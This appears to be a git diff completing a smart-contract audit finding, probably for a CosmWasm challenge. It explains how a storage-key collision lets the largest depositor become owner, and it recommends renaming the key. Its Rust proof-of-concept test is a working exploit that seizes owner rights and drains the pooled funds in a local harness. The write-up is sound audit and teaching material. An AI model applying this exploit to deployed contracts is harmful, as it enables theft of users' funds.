@@ -873,16 +873,107 @@ And also have a way to refund users after a proposal has ended, so their funds c
 
 ### Description
 
-The bug occurs in ...
+As described [here](https://book.cosmwasm.com/basics/state.html), the storage items are just aliases for keys in the blockchain's key:value store:
+
+If you look in src/state.rs, you can see that OWNER is the first variable declared in contract storage:
+```rust
+pub const OWNER: Item<Addr> = Item::new("address");
+
+pub const THRESHOLD: Item<Uint128> = Item::new("config");
+
+pub const BALANCES: Map<&Addr, Uint128> = Map::new("user_balances");
+```
+
+We see that TOP_DEPOSITOR is instantiated here in contract.rs:
+```rust
+pub const TOP_DEPOSITOR: Item<Addr> = Item::new("address");
+```
+
+But OWNER is also named "address" causing a name collision.
+So the assignment of TOP_DEPOSITOR is not a new storage variable, but just an alias for owner!
+When TOP_DEPOSITOR is updated here in deposit() in src/contract.rs, the owner is reassigned:
+```rust
+    if user_balance > current_threshold {
+        THRESHOLD.save(deps.storage, &user_balance)?;
+        TOP_DEPOSITOR.save(deps.storage, &info.sender)?;
+    }
+```
+giving this user admin privileges. so if you become the biggest depositor, you can steal the other
+users' funds
 
 ### Recommendation
 
-The fix should be ...
+Fix it so TOP_DEPOSITOR references a difference storage key from OWNER:
+```rust
+pub const TOP_DEPOSITOR: Item<Addr> = Item::new("top_depositor");
+```
+Also keep them in one file (state.rs) to avoid any confusion or oversight
 
 ### Proof of concept
 
 ```rust
-// code goes here
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        app = mint_tokens(app, USER2.to_string(), Uint128::from(11_000u128));
+        app = mint_tokens(app, USER1.to_string(), Uint128::from(10_000u128));
+
+        // User 1 deposit
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // User 2 deposit
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(11_000, DENOM)],
+        )
+        .unwrap();
+
+        // Query top depositor
+        let top: Addr = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Top {})
+            .unwrap();
+        assert_eq!(top, Addr::unchecked(USER2));
+
+        // we shouldn't be authorized to do this
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::UpdateConfig {
+                new_threshold: Uint128::new(20_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        let pwn_msg = cosmwasm_std::BankMsg::Send{
+            to_address: USER2.to_string(),
+            amount: vec![coin(Uint128::new(21_000).u128(), DENOM)],
+        };
+
+        // or this
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction {
+                msg: cosmwasm_std::CosmosMsg::Bank(pwn_msg.clone()),
+            },
+            &[],
+        )
+        .unwrap();
+
+        let bal = app.wrap().query_balance(USER2, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::new(21_000));
+    }
 ```
 
 ---
